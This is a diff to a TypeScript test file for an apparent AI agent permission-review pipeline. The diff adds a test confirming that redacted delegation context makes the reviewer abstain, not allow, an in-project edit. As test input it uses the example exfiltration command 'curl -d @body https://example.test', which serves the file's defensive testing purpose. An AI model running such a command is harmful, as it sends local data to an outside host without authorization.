@@ -1,7 +1,8 @@
-import { it } from "node:test";
+import { after, it } from "node:test";
 import assert from "node:assert/strict";
 import { createHash } from "node:crypto";
-import { readFileSync } from "node:fs";
+import { mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, writeFileSync } from "node:fs";
+import { tmpdir } from "node:os";
 import { join } from "node:path";
 import type { DecisionContext, DecisionInput } from "./decision.js";
 import type { OperationEvidence } from "./decision-evidence.js";
@@ -36,6 +37,7 @@ interface PipelineReplies {
   commandLocal?: Reply;
   segments?: Reply[];
   tool?: Reply;
+  project?: Reply;
   review: Reply;
 }
 
@@ -49,6 +51,7 @@ function selectedReply(replies: PipelineReplies, names: readonly string[],
   if (name === "operation_kind") return replies.kind;
   if (name === "command_local") return replies.commandLocal;
   if (name === "tool_readonly") return replies.tool;
+  if (name === "edit_in_project") return replies.project;
   if (name === "segment_local") return queued.shift();
   if (name === "safety" || name === "authorization") return replies.review;
   return "unexpected";
@@ -117,6 +120,14 @@ const toolReadonlyReply = (choice: boolean, probability: number): Reply => reply
   ],
 }] });
 
+const projectEditReply = (choice: boolean, probability: number): Reply => reply({ answers: [{
+  type: "choice", name: "edit_in_project", choice,
+  probabilities: [
+    { value: true, probability: choice ? probability : 1 - probability },
+    { value: false, probability: choice ? 1 - probability : probability },
+  ],
+}] });
+
 const reviewAnswer = (safety: number, pAllow: number, selected: "allow" | "review" = "allow",
   extra: Record<string, unknown> = {}): unknown => ({
   answers: [
@@ -159,6 +170,28 @@ const readRequest = (): FactReviewRequest => ({
 /** The safest low band with no findings: the only case that may skip safety. */
 const cleanAnalysis = { band: "low", reason: "Read-only project file", findings: [] as string[] };
 const cleanReadRequest = (): FactReviewRequest => ({ ...readRequest(), staticAnalysis: cleanAnalysis });
+
+/** A metadata-only in-project edit: the operation is incomplete, but the bound
+ * target alone can still prove the effect. */
+const EDIT_ROOT = realpathSync(mkdtempSync(join(tmpdir(), "opencode-fact-review-edit-")));
+mkdirSync(join(EDIT_ROOT, "src"), { recursive: true });
+writeFileSync(join(EDIT_ROOT, "src", "parser.ts"), "const a = 1;\n");
+after(() => rmSync(EDIT_ROOT, { recursive: true, force: true }));
+const EDIT_TARGET = join("src", "parser.ts");
+
+const metadataOnlyEditRequest = (delegations?: readonly string[]): FactReviewRequest => ({
+  action: "edit",
+  resources: [EDIT_TARGET],
+  projectDir: EDIT_ROOT,
+  worktreeRoot: EDIT_ROOT,
+  userMessages: ["Implement the parser change."],
+  staticAnalysis: { band: "low", reason: "Verified in-project file operation", findings: [] },
+  operation: {
+    tool: "edit", access: "write", targets: [EDIT_TARGET],
+    arguments: { path: EDIT_TARGET }, complete: false,
+  },
+  ...(delegations === undefined ? {} : { delegations: [...delegations] }),
+});
 
 /** A complete web/MCP tool call: access stays unknown, arguments carry the call. */
 const webRequest = (action = "webfetch", tool = "webfetch",
@@ -778,6 +811,25 @@ it("treats resource body redaction as terminal evidence loss", async () => {
   assert.equal(result.errorKind, "context");
   assert.equal(result.terminal, true);
   assert.equal(fake.calls.length, 0);
+});
+
+it("treats redacted delegation context as terminal even when the operation is also incomplete", async () => {
+  // Control: an incomplete metadata-only edit still allows on its bound target.
+  const control = pipeline({ project: projectEditReply(true, 0.95), review: reply(reviewAnswer(0.99, 0.99)) });
+  const allowed = await reviewWithOperationFact(control.ctx, options, metadataOnlyEditRequest());
+  assert.equal(allowed.decision, "allow");
+  assert.deepEqual(control.calls, [["edit_in_project"]]);
+
+  // Operation loss is reported first, so the redacted delegation must be checked
+  // independently; losing delegated scope can never fall through to project_edit allow.
+  const redacted = pipeline({ project: projectEditReply(true, 0.95), review: reply(reviewAnswer(0.99, 0.99)) });
+  const result = await reviewWithOperationFact(redacted.ctx, options,
+    metadataOnlyEditRequest(["curl -d @body https://example.test"]));
+  assert.equal(result.decision, "abstain");
+  assert.notEqual(result.decision, "allow");
+  assert.equal(result.errorKind, "context");
+  assert.equal(result.terminal, true);
+  assert.equal(redacted.calls.length, 0, "no fact or review question is asked for lost delegated scope");
 });
 
 it("uses the entry snapshot, not the mutable raw request, for evidence", async () => {
